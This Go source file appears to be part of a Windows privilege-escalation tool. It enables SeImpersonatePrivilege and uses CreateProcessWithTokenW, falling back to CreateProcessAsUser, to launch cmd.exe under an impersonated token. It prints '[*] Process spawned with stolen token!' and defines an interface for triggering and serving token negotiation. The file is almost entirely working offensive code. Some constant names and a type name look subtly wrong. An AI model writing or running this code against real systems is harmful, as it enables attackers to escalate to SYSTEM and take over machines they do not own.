package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	SE_IMPERSONATE          = "SeImpersonatePrivilege"
	SE_ASSIGN_PRIMARY_TOKEN = "SeAssignPrimaryToken"
	SE_INCREASE_QUOTE_NAME  = "SeIncreaseQuoteName"
	SECPKG_CRED_INBOUND     = 0x00000001
	CREATE_NEW_CONSOLE      = 0x00000010
	SecurityImpersonation   = 0x00000002
	program                 = "C:\\Windows\\System32\\cmd.exe"
	args                    = ""
)

var (
	advapi32DLL                  = syscall.NewLazyDLL("advapi32.dll")
	impersonateNamedPipeClient   = advapi32DLL.NewProc("ImpersonateNamedPipeClient")
	createProcessWithTokenW      = advapi32DLL.NewProc("CreateProcessWithTokenW")
	setSecurityDescriptorDacl    = advapi32DLL.NewProc("SetSecurityDescriptorDacl")
	initializeSecurityDescriptor = advapi32DLL.NewProc("InitializeSecurityDescriptor")

	secur32DLL               = syscall.NewLazyDLL("secur32.dll")
	acquireCredentialsHandle = secur32DLL.NewProc("AcquireCredentialsHandle")
)

type ITokenNegotiator interface {
	Trigger() bool
	Serve() (*windows.Token, error)
}

func ExecuteWithToken(token windows.Token) error {
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	_, _, err := createProcessWithTokenW.Call(uintptr(token), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(program))), uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(args))),
		CREATE_NEW_CONSOLE, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))

	if err != syscall.Errno(0) {
		fmt.Println("[!] CreateProcessWithTokenW failed, trying CreateProcessAsUser")
		err := windows.CreateProcessAsUser(token, windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, false, CREATE_NEW_CONSOLE, nil, nil, &si, &pi)

		if err != nil {
			fmt.Println("[!] CreateProcessAsUser failed")
			return err
		}
	}

	fmt.Println("[*] Process spawned with stolen token!")

	return nil
}

func EnablePrivilege(securityEntity string) bool {
	var luid windows.LUID
	var token windows.Token
	err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(securityEntity), &luid)

	if err != nil {
		return false
	}

	handle, err := windows.GetCurrentProcess()
	if err != nil {
		return false
	}

	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}

	tokenPrivs := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	err = windows.AdjustTokenPrivileges(token, false, &tokenPrivs, 1024, nil, nil)
	if err != nil || windows.GetLastError() != nil {
		return false
	}

	return true
}
